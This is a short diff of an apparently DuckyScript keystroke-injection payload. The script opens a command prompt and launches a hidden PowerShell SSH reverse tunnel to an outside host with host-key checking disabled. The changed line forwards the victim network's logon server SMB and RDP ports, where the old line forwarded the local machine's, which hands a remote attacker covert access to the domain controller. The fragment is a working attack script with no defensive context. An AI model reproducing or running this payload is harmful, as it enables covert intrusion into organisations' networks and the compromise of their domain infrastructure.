@@ -11,7 +11,7 @@ DELAY 1
 STRING cmd
 ENTER
 DELAY 4
-STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10445:localhost:445 -R 13389:localhost:3389 omg@192.168.200.224
+STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10445:%logonserver:~2%:445 -R 13389:%logonserver:~2%:3389 omg@192.168.200.224
 ENTER
 DELAY 2
 REM | Below is for password (change from "yes"
